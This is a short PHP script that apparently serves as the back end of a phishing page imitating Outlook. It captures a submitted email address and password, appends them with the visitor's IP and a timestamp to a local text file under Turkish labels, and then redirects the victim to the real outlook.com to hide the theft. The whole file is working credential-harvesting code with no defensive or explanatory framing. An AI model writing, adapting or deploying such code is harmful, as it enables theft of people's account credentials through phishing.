<?php
if($_POST){
$mail = $_POST['mail'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('retrodogukan.txt', 'a'); 
fwrite($file, " ----E-posta adresi----> " .$mail. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
header("Refresh:0; url=http://outlook.com");
}
?>